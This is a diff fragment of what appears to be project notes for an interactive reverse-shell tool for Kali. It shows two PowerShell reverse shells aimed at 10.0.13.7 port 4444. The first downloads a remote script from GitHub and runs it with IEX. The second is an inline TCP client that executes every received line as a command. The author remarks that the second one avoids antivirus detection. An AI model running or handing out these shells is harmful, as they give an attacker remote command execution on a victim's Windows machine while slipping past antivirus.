@@ -57,7 +57,7 @@ This one triggers the antivirus....
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1'); & {windows_victim 10.0.13.7 4444}"
 
 ``` 
-This one doesn't......
+This one doesn't...... (Because it's not really remote....)
 
 ```powershell
 $IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
